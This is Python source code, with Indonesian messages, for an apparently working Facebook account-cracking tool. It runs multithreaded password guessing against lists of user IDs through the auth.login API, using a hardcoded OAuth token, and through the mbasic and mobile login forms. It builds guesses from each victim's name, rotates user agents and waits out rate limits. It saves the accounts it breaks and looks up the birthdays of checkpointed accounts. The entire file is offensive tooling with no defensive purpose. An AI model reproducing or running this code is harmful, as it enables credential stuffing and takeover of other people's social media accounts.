				fall.submit(api, uid, pwek.split(","))
		exit("\n\n\x1b[1;97m [#] crack selesai...")
	elif ask=="2":
		time.sleep (0.01)
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('\x1b[1;93m [\x1b[1;92m+\x1b[1;93m] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa \x1b[1;92mmematikan data\x1b[1;93m selular untuk menje\x1b[1;92mda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit("\n\n\x1b[1;97m [#] crack selesai...")
	elif ask=="3":
		time.sleep (0.01)
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[\x1b[1;92m+\x1b[1;93m] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n\x1b[1;92m [\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa \x1b[1;92mmematikan data selular \x1b[1;93muntuk menjeda \x1b[1;92mproses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n \x1b[1;97m[#] crack selesai...")
	
def sandiotomatis():
	time.sleep (0.01)
	print("\n \x1b[1;92m[ \x1b[1;93mpilih method \x1b[1;92mversion crack -\x1b[1;93m silahkan coba \x1b[1;92msatu² ]\n")
	print(" \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]. \x1b[1;93mmethodd    API \x1b[1;92m(fast)═╗")
	print("\x1b[1;92m [\x1b[1;93m2\x1b[1;92m]. \x1b[1;93mmethodd  mbasic\x1b[1;92m (slow)════╗")
	print("\x1b[1;92m [\x1b[1;93m3\x1b[1;92m]. \x1b[1;93mmethod mobile\x1b[1;92m (super slow)╝")
	ask=raw_input("\n\x1b[1;92m [\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		time.sleep (0.01)
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[\x1b[1;92m+\x1b[1;93m] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa\x1b[1;92m mematikan data selular \x1b[1;93muntuk menjeda\x1b[1;92m proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(api, uid, pwx)
		exit("\n\n\x1b[1;97m [#] crack selesai...")
	elif ask=="2":
		time.sleep (0.01)
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[\x1b[1;92m+\x1b[1;93m] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan \x1b[1;92mdata selular \x1b[1;93muntuk menjeda \x1b[1;92mproses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] \x1b[1;97mcrack selesai...")
	elif ask=="3":
		time.sleep (0.01)
		print('\n\x1b[1;92m [\x1b[1;93m+\x1b[1;92m] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m[\x1b[1;92m+\x1b[1;93m] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa \x1b[1;92mmematikan data \x1b[1;93mselular untuk me\x1b[1;92mnjeda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(api, uid, pwx)
		exit("\n\n\x1b[1;97m [#] crack selesai...")
		
### BAGIAN CRACK ###
def api(uid, pwx):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93m[\x1b[1;92mcrack\x1b[1;93m] %s/%s\x1b[1;92m OK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2'

])
		headers = ({
			'Authorization': 'OAuth 350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)),
			'x-fb-sim-hni': str(random.randint(20000, 40000)),
			'x-fb-net-hni': str(random.randint(20000, 40000)),
			'x-fb-connection-quality': 'EXCELLENT',
			'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'x-fb-http-engine': 'Liger'
		})
		params = {
			'format': 'JSON',
			'sdk_version': '2',
			'email': str(uid),
			'locale': 'en_US',
			'password': str(pw),
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
		file_jason = json.loads(status_masuk.text)
		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
			t=15
			while t:
				mins, secs = divmod(t, 60)
				sys.stdout.write("\r %s[!] aktifkan mode janda selama 5 detik%s"%(M,N))
				sys.stdout.flush()
				sleep(1.5)
				t -= 1
		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
			print("\r  %s > %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("   > %s|%s\n"%(uid, pw))
			break
		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s > %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("   > %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s > %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("   > %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mfbasic(uid, pwx,url,**data):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93m[\x1b[1;92mcrack\x1b[1;93m] %s/%s\x1b[1;92m OK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'

])		
		ge=s.get(url+"/login/?next&ref=dbl&refid=8").text
		sop=parser(ge,"html.parser")
		for i in sop.find_all("raw_input"):
			if i.get("name")==None or "_fb_noscript" in i.get("name") or "sign_up" in i.get("name"):continue
			else:data.update({i.get("name"):i.get("value")})
		data.update({"email":uid,"pass":pw})
		log_in=url+sop.find("form",method="post").get("action")
		if "m.facebook.com" in url:
			s.headers.update({"Host":re.findall("//(.+)",url)[0],"x-fb-lsd":data.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		else:
			if "mbasic.facebook.com" in url:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
			else:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		s.headers.update({"Host":re.findall("//(.+)",url)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":hea,"origin":url,"user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		po=s.post(log_in,data=data)
		if "c_user" in s.cookies.get_dict().keys():
			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
			print("\r  %s > %s|%s|%s"%(H,uid, pw, kukis))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("   > %s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in s.cookies.get_dict().keys():
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s > %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("   > %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s > %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("   > %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == '__main__':
	os.system("git pull")
	buatfolder()
	menu()